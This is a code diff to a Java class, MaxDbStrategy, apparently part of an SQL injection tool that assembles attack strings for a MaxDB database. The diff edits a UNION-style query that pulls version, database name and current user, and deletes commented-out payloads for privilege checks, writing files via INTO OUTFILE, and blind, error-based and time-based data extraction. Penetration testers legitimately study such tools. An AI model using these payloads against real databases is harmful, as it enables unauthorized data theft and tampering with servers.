@@ -15,7 +15,7 @@ public class MaxDbStrategy implements ISQLStrategy {
     @Override
     public String getSchemaInfos() {
         return
-            "SELECT+'MaxDB+(SAP+DB)+'||id||'{%}'||DATABASE()||'{%}'||user()||'{%}'||'%3F'||'%01%03%03%07'r+from+sysinfo.VERSION";
+            "SELECT+'-'||id||'{%}'||DATABASE()||'{%}'||user()||'{%}'||'%3F'||'%01%03%03%07'r+from+sysinfo.VERSION";
     }
 
     @Override
@@ -63,19 +63,6 @@ public class MaxDbStrategy implements ISQLStrategy {
     @Override
     public String getPrivilege() {
         return "";
-//            "concat(" +
-//                "(" +
-//                    "select+" +
-//                        "hex(" +
-//                            "if(count(*)=1,0x" + ToolsString.strhex("true") + ",0x" + ToolsString.strhex("false") + ")" +
-//                        ")" +
-//                    "from+INFORMATION_SCHEMA.USER_PRIVILEGES+" +
-//                    "where+" +
-//                        "grantee=concat(0x27,replace(cast(current_user+as+char),0x40,0x274027),0x27)" +
-//                        "and+PRIVILEGE_TYPE=0x46494c45" +
-//                ")," +
-//                "0x69" +
-//            ")";
     }
 
     @Override
@@ -86,13 +73,6 @@ public class MaxDbStrategy implements ISQLStrategy {
     @Override
     public String writeTextFile(String content, String filePath) {
         return  "";
-//            MediatorModel.model().initialQuery
-//                .replaceAll(
-//                    "1337" + MediatorModel.model().visibleIndex + "7331",
-//                    "(select+0x" + ToolsString.strhex(content) + ")"
-//                )
-//                .replaceAll("--++", "")
-//                + "+into+outfile+\"" + filePath + "\"--+";
     }
 
     @Override
@@ -143,58 +123,16 @@ public class MaxDbStrategy implements ISQLStrategy {
     @Override
     public String blindStrategy(String sqlQuery, String startPosition) {
         return  "";
-//            "(" +
-//                "select+" +
-//                "concat(" +
-//                    "0x53514c69," +
-//                    "mid(" +
-//                        "(" + sqlQuery + ")," +
-//                        startPosition + "," +
-//                        "65536" +
-//                    ")" +
-//                ")" +
-//            ")";
     }
 
     @Override
     public String getErrorBasedStrategyCheck() {
         return  "";
-//            "+and(" +
-//                "select+1+" +
-//                "from(" +
-//                    "select+" +
-//                        "count(*)," +
-//                        "floor(rand(0)*2)" +
-//                    "from+" +
-//                        "information_schema.tables+" +
-//                    "group+by+2" +
-//                ")a" +
-//            ")--+";
     }
 
     @Override
     public String errorBasedStrategy(String sqlQuery, String startPosition) {
         return  "";
-//            "+and" +
-//                "(" +
-//                "select+" +
-//                    "1+" +
-//                "from(" +
-//                    "select+" +
-//                        "count(*)," +
-//                        "concat(" +
-//                            "0x53514c69," +
-//                            "mid(" +
-//                                "(" + sqlQuery + ")," +
-//                                startPosition + "," +
-//                                "64" +
-//                            ")," +
-//                        "floor(rand(0)*2)" +
-//                    ")" +
-//                    "from+information_schema.tables+" +
-//                    "group+by+2" +
-//                ")a" +
-//            ")--+";
     }
 
     @Override
@@ -206,17 +144,6 @@ public class MaxDbStrategy implements ISQLStrategy {
     @Override
     public String timeStrategy(String sqlQuery, String startPosition) {
         return "";
-//            "(" +
-//                "select+" +
-//                    "concat(" +
-//                        "0x53514c69," +
-//                        "mid(" +
-//                            "(" + sqlQuery + ")," +
-//                            startPosition + "," +
-//                            "65536" +
-//                        ")" +
-//                    ")" +
-//            ")";
     }
 
     @Override
@@ -247,5 +174,10 @@ public class MaxDbStrategy implements ISQLStrategy {
     @Override
     public String getLimit(Integer limitSQLResult) {
         return "+having+count(*)+between+" + (limitSQLResult+1) + "+and+" + (limitSQLResult+1);
+    }
+    
+    @Override
+    public String getDbLabel() {
+        return null;
     }
 }
